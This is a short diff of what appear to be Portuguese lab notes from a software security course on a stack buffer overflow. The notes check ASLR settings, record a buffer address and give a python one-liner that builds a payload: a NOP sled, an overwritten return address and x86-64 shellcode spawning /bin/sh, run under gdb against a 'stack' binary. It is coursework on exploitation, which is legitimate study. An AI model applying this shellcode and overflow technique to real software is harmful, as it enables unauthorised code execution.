@@ -1,3 +1,6 @@
+NOTA: Apenas corre utilizando o gdb
+
+
 Disable randomization
 kali@kali:/media/sf_Shared_SegSoft-Kali/Protocolos/3-stack$ cat /proc/sys/kernel/randomize_va_space 
 2
@@ -38,7 +41,7 @@ Inicio do buffer: 0x00007fffffffcdc0
 
 ---------------------------------
 
-Exploit:
+Exploit shell:
 	python -c 'print "\x90"*8*5 + "\xd0\xdf\xff\xff\xff\x7f\x00\x00" + "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"' > smasher
 	gdb stack
 	run
